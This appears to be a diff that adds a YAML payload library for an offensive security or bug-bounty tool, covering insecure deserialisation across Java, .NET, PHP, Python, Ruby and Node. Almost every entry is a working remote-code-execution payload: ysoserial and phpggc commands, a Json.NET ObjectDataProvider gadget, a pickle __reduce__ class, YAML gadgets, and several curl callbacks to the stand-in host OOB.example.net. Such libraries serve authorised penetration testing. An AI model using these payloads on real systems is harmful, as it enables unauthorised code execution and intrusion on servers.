@@ -1,0 +1,242 @@
+id: deserialization
+name: Insecure Deserialization
+version: 1.0.0
+category: deserialisation
+description: |
+  Payloads for insecure deserialisation across Java (ysoserial gadgets), .NET
+  (BinaryFormatter / Json.NET TypeNameHandling), PHP (phar/unserialize), Python
+  (pickle), and Ruby (Marshal). Use only on consented targets.
+mitre:
+  - T1190
+  - T1059
+owasp_top10:
+  - A08:2021
+references:
+  - https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
+  - https://portswigger.net/web-security/deserialization
+  - https://book.hacktricks.xyz/pentesting-web/deserialization
+  - https://github.com/frohoff/ysoserial
+related_tools:
+  - ysoserial
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: java_commons_collections1_oob
+    name: ysoserial CommonsCollections1 ping OOB
+    subcategory: java_gadget
+    encoding: base64
+    tech_targets: [java, commons-collections]
+    severity_when_works: critical
+    payload: |
+      java -jar ysoserial.jar CommonsCollections1 "curl OOB.example.net/cc1" | base64 -w0
+    notes: Use Burp Collaborator
+    source: https://github.com/frohoff/ysoserial
+  - id: java_commons_collections5
+    name: ysoserial CommonsCollections5
+    subcategory: java_gadget
+    encoding: base64
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0
+    notes: null
+    source: https://github.com/frohoff/ysoserial
+  - id: java_groovy
+    name: ysoserial Groovy1
+    subcategory: java_gadget
+    encoding: base64
+    tech_targets: [java, groovy]
+    severity_when_works: critical
+    payload: |
+      java -jar ysoserial.jar Groovy1 "curl OOB.example.net/groovy" | base64 -w0
+    notes: null
+    source: https://github.com/frohoff/ysoserial
+  - id: java_spring1
+    name: ysoserial Spring1
+    subcategory: java_gadget
+    encoding: base64
+    tech_targets: [java, spring]
+    severity_when_works: critical
+    payload: |
+      java -jar ysoserial.jar Spring1 "curl OOB.example.net/spring" | base64 -w0
+    notes: null
+    source: https://github.com/frohoff/ysoserial
+  - id: java_jdk7u21
+    name: ysoserial JDK7u21 dependency-free
+    subcategory: java_gadget
+    encoding: base64
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      java -jar ysoserial.jar JRMPClient OOB.example.net:1099 | base64 -w0
+    notes: Pair with JRMPListener on attacker box
+    source: https://github.com/frohoff/ysoserial
+  - id: java_rome
+    name: ysoserial ROME
+    subcategory: java_gadget
+    encoding: base64
+    tech_targets: [java, rome]
+    severity_when_works: critical
+    payload: |
+      java -jar ysoserial.jar ROME "curl OOB.example.net/rome" | base64 -w0
+    notes: null
+    source: https://github.com/frohoff/ysoserial
+  - id: dotnet_typenamehandling
+    name: Json.NET TypeNameHandling RCE
+    subcategory: dotnet_gadget
+    encoding: raw
+    tech_targets: [dotnet]
+    severity_when_works: critical
+    payload: |
+      {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}
+    notes: When TypeNameHandling != None
+    source: https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html
+  - id: dotnet_objectdataprovider_xml
+    name: ObjectDataProvider XAML RCE
+    subcategory: dotnet_gadget
+    encoding: raw
+    tech_targets: [dotnet, wpf]
+    severity_when_works: critical
+    payload: |
+      <ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+        <ObjectDataProvider x:Key="x" ObjectType = "{x:Type c:Process}" MethodName = "Start">
+          <ObjectDataProvider.MethodParameters>
+            <s:String>cmd</s:String>
+            <s:String>/c calc</s:String>
+          </ObjectDataProvider.MethodParameters>
+        </ObjectDataProvider>
+      </ResourceDictionary>
+    notes: For XamlReader sinks
+    source: https://github.com/pwntester/ysoserial.net
+  - id: php_phar_meta
+    name: PHP phar deserialization
+    subcategory: php_gadget
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      Build phar with serialized object in metadata; trigger via file_exists("phar://upload.phar")
+    notes: PHP < 8 trigger; use phpggc
+    source: https://github.com/ambionics/phpggc
+  - id: php_phpggc_laravel
+    name: phpggc Laravel/RCE2
+    subcategory: php_gadget
+    encoding: base64
+    tech_targets: [php, laravel]
+    severity_when_works: critical
+    payload: |
+      phpggc Laravel/RCE2 'id' -b
+    notes: Base64 encoded payload
+    source: https://github.com/ambionics/phpggc
+  - id: php_phpggc_symfony
+    name: phpggc Symfony/RCE4
+    subcategory: php_gadget
+    encoding: base64
+    tech_targets: [php, symfony]
+    severity_when_works: critical
+    payload: |
+      phpggc Symfony/RCE4 system id -b
+    notes: null
+    source: https://github.com/ambionics/phpggc
+  - id: python_pickle
+    name: Python pickle RCE
+    subcategory: python_gadget
+    encoding: base64
+    tech_targets: [python]
+    severity_when_works: critical
+    payload: |
+      import pickle, base64, os
+      class E:
+          def __reduce__(self):
+              return (os.system, ('curl OOB.example.net/py',))
+      print(base64.b64encode(pickle.dumps(E())).decode())
+    notes: Drop into pickle.loads sink
+    source: https://book.hacktricks.xyz/pentesting-web/deserialization
+  - id: python_pyyaml_yaml_load
+    name: PyYAML yaml.load RCE
+    subcategory: python_gadget
+    encoding: raw
+    tech_targets: [python]
+    severity_when_works: critical
+    payload: |
+      !!python/object/apply:os.system ["curl OOB.example.net/pyy"]
+    notes: PyYAML < 5.1 with yaml.load (not safe_load)
+    source: https://book.hacktricks.xyz/pentesting-web/deserialization
+  - id: python_jsonpickle
+    name: jsonpickle RCE
+    subcategory: python_gadget
+    encoding: raw
+    tech_targets: [python]
+    severity_when_works: critical
+    payload: |
+      {"py/object":"os.system","py/reduce":[{"py/type":"os.system"},["curl OOB.example.net/jp"]]}
+    notes: null
+    source: common knowledge
+  - id: ruby_marshal
+    name: Ruby Marshal RCE (Rails 4.x)
+    subcategory: ruby_gadget
+    encoding: base64
+    tech_targets: [ruby, rails]
+    severity_when_works: critical
+    payload: |
+      ruby -rerb -e 'require "base64"; puts Base64.encode64(Marshal.dump(ERB.new("<%= `id` %>")))'
+    notes: For Marshal.load sinks
+    source: https://www.elttam.com/blog/ruby-deserialization/
+  - id: ruby_psych_yaml
+    name: Ruby Psych YAML RCE
+    subcategory: ruby_gadget
+    encoding: raw
+    tech_targets: [ruby]
+    severity_when_works: critical
+    payload: |
+      --- !ruby/object:Gem::Requirement
+      requirements:
+        - !ruby/object:Gem::DependencyList
+          specs:
+            - !ruby/object:Gem::Source::SpecificFile
+              spec: !ruby/object:Gem::StubSpecification
+                loaded_from: "|id"
+    notes: Variants per Ruby version
+    source: https://www.elttam.com/blog/ruby-deserialization/
+  - id: nodejs_serialize
+    name: Node serialize() RCE
+    subcategory: node_gadget
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: critical
+    payload: |
+      {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(e,r){console.log(r)})}()"}
+    notes: node-serialize <0.0.4
+    source: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+  - id: detection_marker_java
+    name: Java deserialization magic bytes
+    subcategory: detection
+    encoding: base64
+    tech_targets: [java]
+    severity_when_works: medium
+    payload: |
+      rO0AB
+    notes: Base64 prefix of Java serialized stream (\xac\xed\x00\x05)
+    source: common knowledge
+  - id: detection_marker_phar
+    name: PHP phar magic
+    subcategory: detection
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: medium
+    payload: |
+      <?php __HALT_COMPILER();
+    notes: Phar stub
+    source: common knowledge
+  - id: viewstate_no_mac
+    name: ASP.NET ViewState no MAC
+    subcategory: dotnet_gadget
+    encoding: base64
+    tech_targets: [aspnet]
+    severity_when_works: critical
+    payload: |
+      ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c calc"
+    notes: When EnableViewStateMac=false or key leak
+    source: https://github.com/pwntester/ysoserial.net
